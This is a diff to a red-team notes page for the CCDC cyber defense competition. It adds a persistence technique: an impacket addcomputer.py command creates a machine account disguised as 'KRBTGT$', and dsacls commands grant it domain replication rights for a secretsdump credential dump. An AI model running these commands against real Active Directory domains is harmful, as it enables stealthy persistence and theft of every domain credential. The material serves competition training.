@@ -172,6 +172,13 @@ pagetitle: Red Teaming for CCDC
 - This will essentially give the domain user Domain Admin privileges
 	- `impacket-psexec -k -no-pass Administrator@{DC_fqdn}`
 	- Make sure we can resolve both the domain AND the DC itself
+
+**Adding a new Computer Account**
+- Might be overlooked during normal user password rotations
+- `addcomputer.py -computer-name 'KRBTGT$' -computer-pass '{new_password}' -dc-host "{dc_ip}" -domain-netbios '{domain}' '{domain}'/'{owned_user}':'{owner_user_pass}'`
+- Then on Windows, give it permissions over the domain (so we can secretsdump)
+  - `dsacls 'DC={domain},DC={tld}' /I:T /G '{domain}\{machine_account}:CA;Replicating Directory Changes'`
+  - `dsacls 'DC={domain},DC={tld}' /I:T /G '{domain}\{machine_account}:CA;Replicating Directory Changes All'`
 		
 **Shadow Copies**
 - Volume Shadow Service is a Microsoft backup technology that allows creation of snapshots
